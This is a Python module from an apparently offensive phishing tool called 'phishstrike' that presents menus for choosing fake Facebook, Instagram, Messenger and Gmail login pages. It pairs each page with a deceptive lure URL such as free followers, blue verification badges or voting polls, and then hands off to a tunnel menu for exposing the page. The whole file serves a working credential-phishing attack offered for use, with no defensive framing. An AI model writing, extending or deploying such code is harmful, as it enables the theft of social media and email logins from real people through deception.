import os
import time

from phishstrike import state
from phishstrike.tunnel.menu import tunnel_menu
from lib.terminal_ui import *


def site_facebook() -> None:
    print(f"""
{DARK}[{WHITE}01{DARK}]{LIGHT2} Traditional Login Page
{DARK}[{WHITE}02{DARK}]{LIGHT2} Advanced Voting Poll Login Page
{DARK}[{WHITE}03{DARK}]{LIGHT2} Fake Security Login Page
{DARK}[{WHITE}04{DARK}]{LIGHT2} Facebook Messenger Login Page
""")
    reply = slow_input(
        f"{DARK}[{WHITE}-{DARK}]{PURPLE} Select an option : {MEDIUM}",
        start_rgb=RGB_WHITE,
        end_rgb=RGB_CYAN,
    )
    if reply in ["1", "01"]:
        state.website, state.mask = "facebook", "https://blue-verified-badge-for-facebook-free"
        tunnel_menu()
    elif reply in ["2", "02"]:
        state.website, state.mask = "fb_advanced", "https://vote-for-the-best-social-media"
        tunnel_menu()
    elif reply in ["3", "03"]:
        state.website, state.mask = (
            "fb_security",
            "https://make-your-facebook-secured-and-free-from-hackers",
        )
        tunnel_menu()
    elif reply in ["4", "04"]:
        state.website, state.mask = "fb_messenger", "https://get-messenger-premium-features-free"
        tunnel_menu()
    else:
        print(f"\n{DARK}[{WHITE}!{DARK}]{DARK} Invalid Option, Try Again...")
        time.sleep(1)
        os.system("cls" if os.name == "nt" else "clear")
        banner_small()
        site_facebook()


def site_instagram() -> None:
    print(f"""
{DARK}[{WHITE}01{DARK}]{LIGHT2} Traditional Login Page
{DARK}[{WHITE}02{DARK}]{LIGHT2} Auto Followers Login Page
{DARK}[{WHITE}03{DARK}]{LIGHT2} 1000 Followers Login Page
{DARK}[{WHITE}04{DARK}]{LIGHT2} Blue Badge Verify Login Page
""")
    reply = slow_input(
        f"{DARK}[{WHITE}-{DARK}]{PURPLE} Select an option : {MEDIUM}",
        start_rgb=RGB_WHITE,
        end_rgb=RGB_CYAN,
    )
    if reply in ["1", "01"]:
        state.website, state.mask = "instagram", "https://get-unlimited-followers-for-instagram"
        tunnel_menu()
    elif reply in ["2", "02"]:
        state.website, state.mask = "ig_followers", "https://get-unlimited-followers-for-instagram"
        tunnel_menu()
    elif reply in ["3", "03"]:
        state.website, state.mask = "insta_followers", "https://get-1000-followers-for-instagram"
        tunnel_menu()
    elif reply in ["4", "04"]:
        state.website, state.mask = "ig_verify", "https://blue-badge-verify-for-instagram-free"
        tunnel_menu()
    else:
        print(f"\n{DARK}[{WHITE}!{DARK}]{DARK} Invalid Option, Try Again...")
        time.sleep(1)
        os.system("cls" if os.name == "nt" else "clear")
        banner_small()
        site_instagram()


def site_gmail() -> None:
    print(f"""
{DARK}[{WHITE}01{DARK}]{LIGHT2} Gmail Old Login Page
{DARK}[{WHITE}02{DARK}]{LIGHT2} Gmail New Login Page
{DARK}[{WHITE}03{DARK}]{LIGHT2} Advanced Voting Poll
""")
    reply = slow_input(
        f"{DARK}[{WHITE}-{DARK}]{PURPLE} Select an option : {MEDIUM}",
        start_rgb=RGB_WHITE,
        end_rgb=RGB_CYAN,
    )
    if reply in ["1", "01"]:
        state.website, state.mask = "google", "https://get-unlimited-google-drive-free"
        tunnel_menu()
    elif reply in ["2", "02"]:
        state.website, state.mask = "google_new", "https://get-unlimited-google-drive-free"
        tunnel_menu()
    elif reply in ["3", "03"]:
        state.website, state.mask = "google_poll", "https://vote-for-the-best-social-media"
        tunnel_menu()
    else:
        print(f"\n{DARK}[{WHITE}!{DARK}]{DARK} Invalid Option, Try Again...")
        time.sleep(1)
        os.system("cls" if os.name == "nt" else "clear")
        banner_small()
        site_gmail()
